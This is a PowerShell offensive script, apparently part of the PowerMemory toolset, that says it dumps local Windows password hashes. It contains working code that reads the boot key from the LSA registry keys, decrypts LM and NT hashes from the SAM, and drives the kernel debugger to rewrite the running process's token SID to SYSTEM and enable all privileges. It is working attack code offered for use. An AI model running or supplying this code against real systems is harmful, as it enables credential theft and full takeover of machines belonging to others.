<# 
.SYNOPSIS 
Dump local passwords hashes. 
 
.DESCRIPTION 
This script try to elevate itself to system with kernel debugger then dump hashes.
It can be modified to dump hashes remotely 

.LINK 
Original script: powerdump written by David Kennedy http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
Second script modifying ACL in registry: https://github.com/samratashok/nishang
https://github.com/giMini/PowerMemory
.Notes
Reflection added by https://github.com/Zer1t0
#> 

function LoadApi
{
    $oldErrorAction = $global:ErrorActionPreference;
    $global:ErrorActionPreference = "SilentlyContinue";
    $test = [PowerDump.Native];
    $global:ErrorActionPreference = $oldErrorAction;
    if ($test) 
    {
        # already loaded
        return; 
     }

$code = @'
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);

    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);

        }
    } // end namespace PowerDump

    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
'@

   $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
   $dllName = [PsObject].Assembly.Location
   $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
   $assemblies = @("System.dll", $dllName)
   $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
   $compilerParameters.GenerateInMemory = $true
   $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
   if($compilerResults.Errors.Count -gt 0) {
     $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
   }

}

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $s1 = @();
    $s1 += [char]($sid -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
    $s1 += $s1[0];
    $s1 += $s1[1];
    $s1 += $s1[2];
    $s2 = @();
    $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
    $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
    return ,((str_to_key $s1),(str_to_key $s2));
}

function str_to_key($s)
{
    $key = @();
    $key += [Shift]::Right([int]($s[0]), 1 );
    $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
    $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
    $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
    $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
    $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
    $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
    $key += $([int]($s[6]) -band 0x7F);
    0..7 | %{
        $key[$_] = [Shift]::Left($key[$_], 1);
        $key[$_] = $odd_parity[$key[$_]];
        }
    return ,$key;
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default { 
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}	
    	[PowerDump.Native]::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey {
Param(        
    [byte[]]$bootkey,
    $WMI
)
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    #$k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    $subkey = "SAM\SAM\Domains\Account"
    $k = Get-ValueByType -RegistryHive $($regKey.HKEY_LOCAL_MACHINE) -RegistryKeyToQuery $subkey -ValueName "F" -ValueType 3 -WMI $wmi
    #if (-not $k) {return $null}
    [byte[]]$F = $k.Data;
    #if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    
    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
    $LM_exists = $false;
    $NT_exists = $false;
    # LM header check

    if ($u.V[0xa0..0xa3] -eq 20)
    {
        $LM_exists = $true;
    }
    # NT header check
    elseif ($u.V[0xac..0xaf] -eq 20)
    {
        $NT_exists = $true;
    }

    if ($LM_exists -eq $true)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
	
    elseif ($NT_exists -eq $true)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    # LM Hash
    if ($enc_lm_hash)
    {    
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }
    
    # NT Hash
    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + 
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}


# https://msdn.microsoft.com/en-us/library/aa390440(v=vs.85).aspx
$regKey = @{"HKEY_CLASSES_ROOT" = 2147483648; "HKEY_CURRENT_USER" = 2147483649; "HKEY_LOCAL_MACHINE" = 2147483650; "HKEY_USERS" = 2147483651; "HKEY_CURRENT_CONFIG" = 2147483653;}
$regType = @{"REG_SZ" = 1; "REG_EXPAND_SZ" = 2; "REG_BINARY" = 3; "REG_DWORD" = 4; "REG_MULTI_SZ" = 7; "REG_QWORD" = 11;}

function Get-ValueByType {
Param(
        [string] $RegistryKeyToQuery,
        [string[]] $ValueName,
        $ValueType,
        $RegistryHive,
        $WMI
    )

    Switch($ValueType) {
            $regType.REG_SZ {
            $RegValue = $wmi.GetStringValue($RegistryHive, $RegistryKeyToQuery, $ValueName)
            Break
            }
            $regType.REG_EXPAND_SZ {
            $RegValue = $wmi.GetExpandedStringValue($RegistryHive, $RegistryKeyToQuery, $ValueName)
            Break
            }
            $regType.REG_BINARY {
            $RegValue = $wmi.GetBinaryValue($RegistryHive, $RegistryKeyToQuery, $ValueName)
            Break
            }
            $regType.REG_DWORD {
            $RegValue = $wmi.GetDWORDValue($RegistryHive, $RegistryKeyToQuery, $ValueName)
            Break
            }
            $regType.REG_MULTI_SZ {
            $RegValue = $wmi.GetMultiStringValue($RegistryHive, $RegistryKeyToQuery, $ValueName)
            Break
            }
            $regType.REG_QWORD {
            $RegValue = $wmi.GetQWORDValue($RegistryHive, $RegistryKeyToQuery, $ValueName)
            Break
            }
    }
        
    if ($RegValue.ReturnValue -eq 0) {
        if (@($RegValue.Properties | Select-Object -ExpandProperty Name) -contains "sValue") {
            # String, Multi-String, and Expanded String Values
            New-Object -TypeName PSObject -Property @{"Hive"=$RegistryHive; "Key"=$RegistryKeyToQuery; "Value"=$ValueName; "DataType"=$ValueType; "Data"=$RegValue.sValue} 
        }
        else {
            # DWord, QWord, and Binary Values
            New-Object -TypeName PSObject -Property @{"Hive"=$RegistryHive; "Key"=$RegistryKeyToQuery; "Value"=$ValueName; "DataType"=$ValueType; "Data"=$RegValue.uValue} 
        }
    }
}

function Get-AllValuesInASubkey {
Param(
        [string] $RegistryKeyToQuery,
        $RegistryHive,
        $WMI
    )
    $values = $wmi.EnumValues($RegistryHive, $RegistryKeyToQuery)
    if ($values.ReturnValue -eq 0) {
        $Total = $values.sNames.Count
        for ($Count=0; $Count -lt $Total; $Count++)
        {
            $valueName = $values.sNames[$Count]
            $valueType = $values.Types[$Count]

            $valueInTheSubkey = Get-ValueByType  -RegistryHive $RegistryHive -RegistryKeyToQuery $RegistryKeyToQuery -ValueName $valueName -ValueType $valueType -WMI $WMI
            $valueInTheSubkey
        }
    }
}

# Thanks to Boe Prox for his Get-RegistryKeyTimestamp function (https://gallery.technet.microsoft.com/scriptcenter/Get-RegistryKeyLastWriteTim-63f4dd96)
function Get-RegistryKeyTimestamp {
    [OutputType('Microsoft.Registry.Timestamp')]
    [cmdletbinding(
        DefaultParameterSetName = 'ByValue'
    )]
    Param (
        [parameter(ValueFromPipeline=$True, ParameterSetName='ByValue')]
        [Microsoft.Win32.RegistryKey]$RegistryKey,
        [parameter(ParameterSetName='ByPath')]
        [string]$SubKey,
        [parameter(ParameterSetName='ByPath')]
        [Microsoft.Win32.RegistryHive]$RegistryHive,
        [parameter(ParameterSetName='ByPath')]
        [string]$Computername
    )
    Begin {
        #region Create Win32 API Object
        Try {
            [void][advapi32]
        } Catch {
            #region Module Builder
            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('RegAssembly')
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run) # Only run in memory
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('RegistryTimeStampModule', $False)
            #endregion Module Builder
 
            #region DllImport
            $TypeBuilder = $ModuleBuilder.DefineType('advapi32', 'Public, Class')
 
            #region RegQueryInfoKey Method
            $PInvokeMethod = $TypeBuilder.DefineMethod(
                'RegQueryInfoKey', #Method Name
                [Reflection.MethodAttributes] 'PrivateScope, Public, Static, HideBySig, PinvokeImpl', #Method Attributes
                [IntPtr], #Method Return Type
                [Type[]] @(
                    [Microsoft.Win32.SafeHandles.SafeRegistryHandle], #Registry Handle
                    [System.Text.StringBuilder], #Class Name
                    [UInt32 ].MakeByRefType(),  #Class Length
                    [UInt32], #Reserved
                    [UInt32 ].MakeByRefType(), #Subkey Count
                    [UInt32 ].MakeByRefType(), #Max Subkey Name Length
                    [UInt32 ].MakeByRefType(), #Max Class Length
                    [UInt32 ].MakeByRefType(), #Value Count
                    [UInt32 ].MakeByRefType(), #Max Value Name Length
                    [UInt32 ].MakeByRefType(), #Max Value Name Length
                    [UInt32 ].MakeByRefType(), #Security Descriptor Size           
                    [long].MakeByRefType() #LastWriteTime
                ) #Method Parameters
            )
 
            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
            $FieldArray = [Reflection.FieldInfo[]] @(       
                [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
            )
 
            $FieldValueArray = [Object[]] @(
                'RegQueryInfoKey', #CASE SENSITIVE!!
                $True
            )
 
            $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
                $DllImportConstructor,
                @('advapi32.dll'),
                $FieldArray,
                $FieldValueArray
            )
 
            $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
            #endregion RegQueryInfoKey Method
 
            [void]$TypeBuilder.CreateType()
            #endregion DllImport
        }
        #endregion Create Win32 API object
    }
    Process {
        #region Constant Variables
        $ClassLength = 255
        [long]$TimeStamp = $null
        #endregion Constant Variables
 
        #region Registry Key Data
        If ($PSCmdlet.ParameterSetName -eq 'ByPath') {
            #Get registry key data
            $RegistryKey = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($RegistryHive, $Computername).OpenSubKey($SubKey)
            If ($RegistryKey -isnot [Microsoft.Win32.RegistryKey]) {
                Throw "Cannot open or locate $SubKey on $Computername"
            }
        }
 
        $ClassName = New-Object System.Text.StringBuilder $RegistryKey.Name
        $RegistryHandle = $RegistryKey.Handle
        #endregion Registry Key Data
 
        #region Retrieve timestamp
        $Return = [advapi32]::RegQueryInfoKey(
            $RegistryHandle,
            $ClassName,
            [ref]$ClassLength,
            $Null,
            [ref]$Null,
            [ref]$Null,
            [ref]$Null,
            [ref]$Null,
            [ref]$Null,
            [ref]$Null,
            [ref]$Null,
            [ref]$TimeStamp
        )
        Switch ($Return) {
            0 {
               #Convert High/Low date to DateTime Object
                $LastWriteTime = [datetime]::FromFileTime($TimeStamp)
 
                #Return object
                $Object = [pscustomobject]@{
                    FullName = $RegistryKey.Name
                    Name = $RegistryKey.Name -replace '.*\\(.*)','$1'
                    LastWriteTime = $LastWriteTime
                }
                $Object.pstypenames.insert(0,'Microsoft.Registry.Timestamp')
                $Object
            }
            122 {
                Throw "ERROR_INSUFFICIENT_BUFFER (0x7a)"
            }
            Default {
                Throw "Error ($return) occurred"
            }
        }
        #endregion Retrieve timestamp
    }
}

function Get-UserName([byte[]]$V) {
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-LastLogonDate([byte[]]$F) {
    $i=0
    $lastLogon = ""    
    $hexLastLogon = @()    
    while($i -lt $F.Length) {
        if($i -eq 8 -or ($i -gt 7 -and $i -lt 16)) {
            $lastLogon = $lastLogon + $F[$i]
            $hexLastLogon += '{0:X2}' -f $F[$i]        
        }
        $i++
    }

    $i=$hexLastLogon.Length - 1
    $lastLogon = ""
    while($i -ge 0) {
        $lastLogon = $lastLogon + $hexLastLogon[$i]
        $i--
    }
    $lastLogon = "0x$lastLogon"
    return $lastLogon
}

function Get-PasswordLastSet([byte[]]$F) {
    $i=0    
    $passwordLastSet = ""
    $hexPasswordLastSet = @()
    while($i -lt $F.Length) {
        if($i -eq 24 -or ($i -gt 23 -and $i -lt 32)) {
            $passwordLastSet = $passwordLastSet + $F[$i]
            $hexPasswordLastSet += '{0:X2}' -f $F[$i]  
        }
        $i++
    }

  $i=$hexPasswordLastSet.Length - 1
    $passwordLastSet = ""
    while($i -ge 0) {
        $passwordLastSet = $passwordLastSet + $hexPasswordLastSet[$i]
        $i--
    }
    $passwordLastSet = "0x$passwordLastSet"
    return $passwordLastSet
}

function Get-LastWriteTime($key) {
    $RegistryKey = Get-Item $key
    $extendExport = $RegistryKey | Get-RegistryKeyTimestamp    
    return $extendExport
}

#---------------------------------------------------------[Initialisations]--------------------------------------------------------

Set-StrictMode -version 2

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptGreatParentPath = split-path -parent $scriptParentPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptParentPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptGreatParentPath\PowerProcess\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$kd = "$scriptGreatParentPath\PowerProcess\x64\kd.exe"
$symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
$utilityFunctions = "$scriptGreatParentPath\PowerProcess\Get-Utilities.ps1"
$strComputer = $env:computername

#----------------------------------------------------------[Functions]-------------------------------------------------------------

. $utilityFunctions

#----------------------------------------------------------[Execution]-------------------------------------------------------------

$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
$osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

$mode = Get-OperatingSystemMode $operatingSystem $osArchitecture

$symfix = ""
$delta = 0
Switch ($mode) {
    "1" { 
            $offset = "208"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = "0x188"
        }
    "132" { 
            $offset = "f8"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = ""
        }
    "2" { 
            $offset = "348"
            $sidHashOffset = "+0x0e8+0x010"
            $activeProcessLinksOffset = "0x2e8"
        }
    "8.1" {
            $delta = -6
            $offset = "348"
            $sidHashOffset = "+0x0e8+0x010"
            $activeProcessLinksOffset = "0x2e8"
            $protectedProcessOffset = "+0x67a" # Protection
            $protectProcess = "L1 0x61" # LSASS with protection 0x61
        }
    "2r2" {# to do
        }
    "232" {# to do
        }
    "2016" { 
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
        }
    "1014342" {
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
            $symfix = ".symfix
.reload /f nt"
    }
}


$Process = "$((Get-Process -ID $pid).Name).exe"
Write-Output "`r`n=============================="
whoami
Write-Output "==============================`r`n"
Write-Output "Trying to give full privileges to the process $Process"

$chain = "$symfix
!process 0 0 $Process"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"PROCESS") + 1
$processAddress = $tabFA[$fi]
Write-Output "$Process memory address found!"

$chain =  "$symfix
dq $processAddress+$offset L1"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')                
$fi = [array]::indexof($tabFA,"L1") + 3
$processTokenAddress = $tabFA[$fi] -replace "``", ""
Write-Output "$Process token address found!"

$chain = "$symfix
? $processTokenAddress & fffffffffffffff0"
Write-InFile $buffer "$chain"
$tabAnd = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabAnd -split ' ') 
$fi = [array]::indexof($tabFA,"fffffffffffffff0") + 5
$processTokenAddressAnded = $tabFA[$fi] -replace "``", ""

$chain =  "$symfix
dt -v -b nt!_TOKEN UserAndGroups $processTokenAddressAnded"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$fi = [array]::indexof($tabFA,"lkd>") + 31 + $delta
$structTOKENAddress = $tabFA[$fi]
$fi = [array]::indexof($tabFA,"lkd>") + 21 + $delta
$elementsNumber = $tabFA[$fi]
Write-Output "$elementsNumber elements"

$chain =  "$symfix
dt -v -b nt!_SID_AND_ATTRIBUTES $structTOKENAddress"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$fi = [array]::indexof($tabFA,"lkd>") + 43 + $delta
$structSIDANDATTRIBUTESAddress = $tabFA[$fi]
$fi = [array]::indexof($tabFA,"lkd>") + 20 + $delta
$elementsNumber = $tabFA[$fi]
Write-Output "struct _SID_AND_ATTRIBUTES memory address: $structSIDANDATTRIBUTESAddress - $elementsNumber elements"

$chain = "$symfix
!sid $structSIDANDATTRIBUTESAddress"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$fi = [array]::indexof($tabFA,"lkd>") + 17 + $delta
$sidValue = ""
$sidValue = $tabFA[$fi]
Write-Output "SID is: $sidValue"

Write-Output "Modifying SID..."
$chain ="$symfix
r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthorityCount=1)"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$chain ="$symfix
r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthority[0]=18)"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols

$chain = "$symfix
!sid $structSIDANDATTRIBUTESAddress"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$fi = [array]::indexof($tabFA,"lkd>") + 17 + $delta
$sidValue = $tabFA[$fi]
Write-Output "SID is: $sidValue"

Write-Output "Modifying Privileges..."
$tokenPrivilegesOffset = "$processTokenAddressAnded+0x40"
$chain = "f $tokenPrivilegesOffset L18 0xff"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

# dt -b -v nt!_token SidHash. tokenAddress
# dd tokenAddress+0x0e0+0x010 L40
Write-Output "Modifying SIDHash..."
$hashSystem = "0x16 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x08 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x1c 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00"
